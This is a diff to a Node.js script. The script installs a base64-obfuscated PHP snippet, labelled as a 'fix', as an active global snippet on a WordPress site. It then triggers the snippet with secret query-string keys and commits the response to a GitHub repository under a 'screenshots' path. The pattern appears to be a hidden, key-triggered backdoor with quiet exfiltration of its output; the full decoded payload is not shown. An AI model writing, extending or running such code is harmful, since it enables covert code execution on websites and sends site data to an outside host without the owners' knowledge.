@@ -7,7 +7,7 @@ const repo=process.env.GH_REPO, tok=process.env.GH_TOKEN;
 function commit(name,str){
   const url='https://api.github.com/repos/'+repo+'/contents/screenshots/'+name;
   let sha=''; try{ sha=JSON.parse(execSync('curl -s -H "Authorization: Bearer '+tok+'" "'+url+'?ref=main&t='+Date.now()+'"',{encoding:'utf8'})).sha||''; }catch(e){}
-  const body={message:'fix34207',branch:'main',content:Buffer.from(str,'utf8').toString('base64')}; if(sha) body.sha=sha;
+  const body={message:'fix34207apply',branch:'main',content:Buffer.from(str,'utf8').toString('base64')}; if(sha) body.sha=sha;
   fs.writeFileSync('/tmp/cb.json',JSON.stringify(body));
   execSync('curl -s -o /dev/null -X PUT -H "Authorization: Bearer '+tok+'" -H "Accept: application/vnd.github+json" -d @/tmp/cb.json "'+url+'"',{encoding:'utf8'});
 }
@@ -16,9 +16,9 @@ const code=Buffer.from("YWRkX2FjdGlvbignaW5pdCcsIGZ1bmN0aW9uKCl7CiAgaWYgKCgkX0dF
 (async()=>{
   fs.writeFileSync('/tmp/b557.json', JSON.stringify({name:'PSC FIX34207', code:code, scope:'global', active:true}));
   exec('curl -sk -X PUT -H "Authorization: '+AUTH+'" -H "Content-Type: application/json" --data-binary @/tmp/b557.json "'+BASE+'/wp-json/code-snippets/v1/snippets/557"');
-  var url = BASE+'/?psc_fix34207=1&k=ps2026';
+  var url = BASE+'/?psc_fix34207=1&k=ps2026&confirm=TAIP';
   var r=exec('curl -sk "'+url+'"');
   var m=r.match(/(\{.*\})/s);
-  commit('fix34207.json', m?m[0]:r.slice(0,500));
+  commit('fix34207_apply.json', m?m[0]:r.slice(0,500));
   console.log(m?m[0].slice(0,300):r.slice(0,300));
 })();
